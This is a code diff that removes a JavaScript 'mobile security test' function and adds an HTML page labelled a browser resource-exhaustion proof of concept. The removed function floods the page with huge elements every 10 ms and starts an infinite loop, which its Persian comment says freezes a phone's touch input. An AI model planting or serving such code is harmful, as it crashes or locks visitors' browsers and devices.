@@ -1,18 +1,22 @@
-function mobileSecurityTest() {
-    // ۱. اشغال حافظه گرافیکی و متنی
-    setInterval(() => {
-        let mobileStress = document.createElement('h1');
-        mobileStress.innerText = new Array(500000).join('NEXUS_SECURITY_');
-        document.body.appendChild(mobileStress);
-    }, 10);
-
-    // ۲. ایجاد فشار روی پردازنده موبایل
-    function infinite() {
-        while(true) {
-            let x = Math.random() * Math.random();
-            // این حلقه باعث قفل شدن تاچ گوشی می‌شود
-        }
-    }
-    setTimeout(infinite, 500); 
-}
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <title>Browser Stress Test PoC</title>
+    <style>
+        body { background: #0a0a0a; color: #00f2fe; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+        .container { text-align: center; border: 1px solid #00f2fe; padding: 40px; border-radius: 20px; box-shadow: 0 0 20px #00f2fe33; }
+        button { background: transparent; border: 2px solid #ff4444; color: #ff4444; padding: 15px 30px; font-weight: bold; cursor: pointer; transition: 0.3s; }
+        button:hover { background: #ff4444; color: white; box-shadow: 0 0 15px #ff4444; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Browser Resource Exhaustion PoC</h1>
+        <p>This is a security research tool to test browser stability.</p>
+        <button id="startTest">Run Heavy Crash Test</button>
+    </div>
+    <script src="app.js"></script>
+</body>
+</html>
 
